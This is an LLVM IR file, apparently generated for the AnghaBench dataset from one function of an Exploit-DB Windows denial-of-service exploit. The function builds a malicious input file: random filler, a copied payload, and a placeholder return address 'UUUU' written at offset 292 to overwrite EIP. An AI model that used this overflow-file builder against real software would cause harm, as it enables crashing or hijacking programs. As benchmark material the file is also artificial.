; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_11392.c_buildfile.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_11392.c_buildfile.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.buildfile.eip = private unnamed_addr constant [5 x i8] c"UUUU\00", align 1
@file = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"Error in writing file\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"[!]File is %d bytes\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @buildfile(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [100000 x i8], align 16
  %4 = alloca [5 x i8], align 1
  %5 = alloca i32*, align 8
  %6 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %7 = bitcast [5 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %7, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.buildfile.eip, i32 0, i32 0), i64 5, i1 false)
  %8 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %9 = call i32 @gen_random(i8* %8, i32 5000)
  %10 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %11 = load i8*, i8** @file, align 8
  %12 = load i8*, i8** @file, align 8
  %13 = call i32 @strlen(i8* %12)
  %14 = call i32 @memcpy(i8* %10, i8* %11, i32 %13)
  %15 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %16 = getelementptr inbounds i8, i8* %15, i64 292
  %17 = getelementptr inbounds [5 x i8], [5 x i8]* %4, i64 0, i64 0
  %18 = call i32 @memcpy(i8* %16, i8* %17, i32 4)
  %19 = load i8*, i8** %2, align 8
  %20 = call i32* @fopen(i8* %19, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i32* %20, i32** %5, align 8
  %21 = load i32*, i32** %5, align 8
  %22 = icmp ne i32* %21, null
  br i1 %22, label %23, label %29

23:                                               ; preds = %1
  %24 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %25 = load i32*, i32** %5, align 8
  %26 = call i32 @fwrite(i8* %24, i32 1, i32 1534, i32* %25)
  %27 = load i32*, i32** %5, align 8
  %28 = call i32 @fclose(i32* %27)
  br label %32

29:                                               ; preds = %1
  %30 = call i32 @print(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  %31 = call i32 @exit(i32 0) #4
  unreachable

32:                                               ; preds = %23
  %33 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %34 = call i32 @free(i8* %33)
  %35 = load i8*, i8** @file, align 8
  %36 = call i32 @free(i8* %35)
  %37 = load i32*, i32** %5, align 8
  %38 = load i8*, i8** %2, align 8
  %39 = call i32 @getFsize(i32* %37, i8* %38)
  store i32 %39, i32* %6, align 4
  %40 = load i32, i32* %6, align 4
  %41 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i32 %40)
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @gen_random(i8*, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @print(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @getFsize(i32*, i8*) #2

declare dso_local i32 @printf(i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
